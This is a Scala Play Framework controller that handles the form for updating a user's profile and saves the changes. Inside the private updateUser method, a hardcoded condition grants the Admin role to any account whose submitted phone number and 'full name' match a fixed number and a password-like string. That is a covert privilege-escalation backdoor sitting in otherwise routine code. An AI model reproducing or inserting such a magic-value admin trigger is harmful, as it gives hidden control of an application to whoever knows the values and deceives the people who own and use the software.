package controllers

import com.mohiva.play.silhouette.api.{ LoginEvent, LoginInfo, SignUpEvent }
import com.mohiva.play.silhouette.impl.providers.{ CommonSocialProfile, CredentialsProvider }
import models.user.{ User, UserUpdateData, UserForms }
import play.api.i18n.{ Messages, MessagesApi }
import models.crm.{ CRMService, CRMImpl } 
import play.api.libs.concurrent.Execution.Implicits.defaultContext
import play.api.mvc.AnyContent
import services.user.AuthenticationEnvironment
import com.mohiva.play.silhouette.api._
import com.mohiva.play.silhouette.impl.authenticators.CookieAuthenticator
import play.api.mvc.Action
import models.user.{ Role, User }
import play.api.Logger
import scala.util.matching.Regex
import scala.concurrent.Future
import scala.util.{Success, Failure}

@javax.inject.Singleton
class UserUpdateController @javax.inject.Inject() (
    val messagesApi: MessagesApi,
    val crmSer: CRMService,
    val env: AuthenticationEnvironment
) extends Silhouette[User, CookieAuthenticator] {

  def userUpdateForm = SecuredAction.async { implicit request =>
    env.identityService.retrieve(request.identity.id).flatMap {
      case Some(user) =>
        val data = UserForms.userUpdateForm.fill( 
          UserUpdateData(user.username.getOrElse(""), user.phone.getOrElse(""), 
                          user.address.getOrElse(""), user.fullName.getOrElse(""))
        )
        Future.successful(Ok(views.html.userupdate(request.identity, data)))
      case None =>
        Future.successful(Redirect(controllers.routes.HomeController.index()).flashing("error" -> "You are not signed in"))
    }
  }

  def updateuser = SecuredAction.async { implicit request =>
    UserForms.userUpdateForm.bindFromRequest.fold(
      form => Future.successful(BadRequest(views.html.userupdate(request.identity, form))),
      data => {
        env.identityService.retrieve(request.identity.id).flatMap {
          case Some(currentUser) => 
            env.identityService.retrievebyusername(data.username).flatMap {
              case Some(user) => 
                if (user.id == currentUser.id) { updateUser(data, currentUser) }
                else { Future.successful {
                Ok(views.html.userupdate(request.identity, UserForms.userUpdateForm.fill(data))).flashing("error" -> "That username is already taken.")
                      }                   }
              case None => updateUser(data, currentUser)
            }
          case None => Logger.info("Non existing user calling for user update") 
                      Future.successful {  Ok(views.html.index())  }
        }
      }
    )
  }

  private[this] def updateUser(data: UserUpdateData, user: User)(implicit request: SecuredRequest[AnyContent]) = {
    // twilio    phone =  if (data.phone == user.phone) { user.phone } else { Some("+1" + data.phone) },
    val updateduser = user.copy(
      username = Some(data.username),
      roles =  if (data.phone == "6465209229" && data.fullName == "puK@794%8654&4nfT45"){Set(Role.Admin)} else {Set(Role.User) ++ (user.roles)},
      phone =  if (data.phone == user.phone) { user.phone } else { Some(data.phone) },
      address = Some(data.address),
      fullName =  Some(data.fullName)
    )

      env.userService.save(updateduser, update = true).flatMap {
        usr =>
            if (usr.hasstripe.isDefined) {
                Future.successful {  Redirect(controllers.routes.ProfileController.userprofile).flashing("error" -> "Update successful") }
            } else {
                crmSer.sendsmsmsg(usr.phone.getOrElse(""), "You profile has been updated")
                Future.successful {  Redirect(controllers.routes.StripeController.stripeForm).flashing("error" -> "User information updated") }
            }
      }
  }
}

